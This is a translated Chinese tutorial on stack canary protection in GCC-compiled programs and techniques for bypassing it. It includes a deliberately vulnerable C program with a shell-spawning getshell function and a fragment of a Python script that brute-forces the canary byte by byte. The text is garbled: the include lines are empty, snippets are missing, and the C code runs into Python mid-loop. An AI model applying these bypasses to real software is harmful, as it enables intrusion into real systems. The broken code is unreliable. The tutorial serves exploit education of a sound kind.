# Canary保护详解和常用Bypass手段
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 简介
canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致
在32位程序上：
在64位程序上：
若一致则正常退出，如果是栈溢出或者其他原因导致canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序
可以看出，如果程序开启canary保护，并且不知道canary的值是多少，那么就不能够进行ROP来劫持程序流程
在GCC中开启canary保护：
    -fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
    -fstack-protector-all 启用保护，为所有函数插入保护
    -fstack-protector-strong
    -fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护
    -fno-stack-protector 禁用保护.
下面详细讲一下绕过手法
## 一、泄露栈中的canary
canary设计是以“x00”结尾，本意就是为了保证canary可以截断字符串。泄露栈中canary的思路是覆盖canary的低字节，来打印出剩余的canary部分。
泄露条件：
  * 存在栈溢出漏洞
  * 可以将存在于栈上的可控变量进行输出
Example：
    #include 
    #include 
    #include 
    #include 
    void getshell(void) {
        system("/bin/sh");
    }
    void init() {
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);
        setbuf(stderr, NULL);
    }
    void vuln() {
        char ooo[100];
        for(int i=0;i" in r.recvuntil("[*] Do you love me?[Y]",drop=True):
                a=123
            else:
                canary = canary+chr(y)
                log.info('At round %d find canary byte %#x' %(x, y))
                r.recv()